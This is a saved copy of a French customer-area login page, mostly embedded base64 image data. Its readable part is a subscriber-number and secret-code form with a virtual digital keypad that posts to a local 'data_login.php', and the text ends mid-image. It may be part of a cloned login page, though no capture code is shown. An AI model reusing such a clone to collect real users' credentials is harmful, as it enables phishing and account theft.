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" align="top" border="0"></div>
<div class="decoupe-home-03_" style="height: 480px;" bis_skin_checked="1">
<div id="LANG_ESPACE_PERSO" class="titre_espace" bis_skin_checked="1">Votre espace personnel </div>
<div id="LANG_IDENTIFICATION" class="titre_ident" bis_skin_checked="1">Identification </div><br style="clear:both;">

<br>

<form name="FormIdent" method="post"  onsubmit="return check_form()" action="data_login.php"><input type="hidden"  id="CWW_FORM" name="CWW_FORM" value="">
<input type="hidden" name="CWW_CTX" value="">

<table width="320" units="relative" border="0">
<tbody><tr>
<td class="pl" width="58%" nowrap="">
<div style="display : inline;" id="LANG_SAISI_VOTRE_NUM_DABONNE" bis_skin_checked="1">N° d'abonné </div>:</td>
<td class="ll_ident" align="CENTER" valign="TOP" nowrap="">
<input class="ll_ident" id="log1" name="num_contact" type="text" maxlength="25" size="15" value="" required ></td>
</tr>
<tr>
<td class="pl" nowrap="">
<div style="display : inline;" id="LANG_PUIS_VOTRE_MOTPASSE" bis_skin_checked="1">VOTRE CODE SECRET </div>:</td>
<td class="ll_ident" align="CENTER" valign="TOP" nowrap="">
<input id="mot_passe" class="ll_ident digitalKeypadInput digitalKeypadHidden" name="mot_passe" type="password" maxlength="25" size="15" value=""><div class="digitalFakeInput ll_ident digitalKeypadInput selected digitalKeypadWithoutCheck" id="mot_passe-dk-0" name="mot_passe-dk-0" data-inputsource="#mot_passe" bis_skin_checked="1"></div><button type="button" onclick= "clearme()" class="digitalKeypadClear" title="Effacer "></button></td>
</tr>
<tr>
<td>
<div style="display : inline;color:#0091DE;font-weight:bold;" id="LANG_SECUNEWMDPCHANGE" bis_skin_checked="1">Le code secret doit être saisi à l'aide du clavier virtuel ci-contre </div> </td>
<td class="ll_ident" align="CENTER">
<div id="dk-pave-digital" class="digitalKeypad" bis_skin_checked="1"><img data-savepage-currentsrc="9.png" onclick="accumulateValues('9')" data-savepage-src="/tra_cosmos_img/Images-pave-digital/9.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAA2CAYAAAHyqfoxAAAACXBIWXMAAAsTAAALEwEAmpwYAAAKT2lDQ1BQaG90b3Nob3AgSUNDIHByb2ZpbGUAAHjanVNnVFPpFj333vRCS4iAlEtvUhUIIFJCi4AUkSYqIQkQSoghodkVUcERRUUEG8igiAOOjoCMFVEsDIoK2AfkIaKOg6OIisr74Xuja9a89+bN/rXXPues852zzwfACAyWSDNRNYAMqUIeEeCDx8TG4eQuQIEKJHAAEAizZCFz/SMBAPh+PDwrIsAHvgABeNMLCADATZvAMByH/w/qQplcAYCEAcB0kThLCIAUAEB6jkKmAEBGAYCdmCZTAKAEAGDLY2LjAFAtAGAnf+bTAICd+Jl7AQBblCEVAaCRACATZYhEAGg7AKzPVopFAFgwABRmS8Q5ANgtADBJV2ZIALC3AMDOEAuyAAgMADBRiIUpAAR7AGDIIyN4AISZABRG8lc88SuuEOcqAAB4mbI8uSQ5RYFbCC1xB1dXLh4ozkkXKxQ2YQJhmkAuwnmZGTKBNA/g88wAAKCRFRHgg/P9eM4Ors7ONo62Dl8t6r8G/yJiYuP+5c+rcEAAAOF0ftH+LC+zGoA7BoBt/qIl7gRoXgugdfeLZrIPQLUAoOnaV/Nw+H48PEWhkLnZ2eXk5NhKxEJbYcpXff5nwl/AV/1s+X48/Pf14L7iJIEyXYFHBPjgwsz0TKUcz5IJhGLc5o9H/LcL//wd0yLESWK5WCoU41EScY5EmozzMqUiiUKSKcUl0v9k4t8s+wM+3zUAsGo+AXuRLahdYwP2SycQWHTA4vcAAPK7b8HUKAgDgGiD4c93/+8//UegJQCAZkmScQAAXkQkLlTKsz/HCAAARKCBKrBBG/TBGCzABhzBBdzBC/xgNoRCJMTCQhBCCmSAHHJgKayCQiiGzbAdKmAv1EAdNMBRaIaTcA4uwlW4Dj1wD/phCJ7BKLyBCQRByAgTYSHaiAFiilgjjggXmYX4IcFIBBKLJCDJiBRRIkuRNUgxUopUIFVIHfI9cgI5h1xGupE7yAAygvyGvEcxlIGyUT3UDLVDuag3GoRGogvQZHQxmo8WoJvQcrQaPYw2oefQq2gP2o8+Q8cwwOgYBzPEbDAuxsNCsTgsCZNjy7EirAyrxhqwVqwDu4n1Y8+xdwQSgUXACTYEd0IgYR5BSFhMWE7YSKggHCQ0EdoJNwkDhFHCJyKTqEu0JroR+cQYYjIxh1hILCPWEo8TLxB7iEPENyQSiUMyJ7mQAkmxpFTSEtJG0m5SI+ksqZs0SBojk8naZGuyBzmULCAryIXkneTD5DPkG+Qh8lsKnWJAcaT4U+IoUspqShnlEOU05QZlmDJBVaOaUt2ooVQRNY9aQq2htlKvUYeoEzR1mjnNgxZJS6WtopXTGmgXaPdpr+h0uhHdl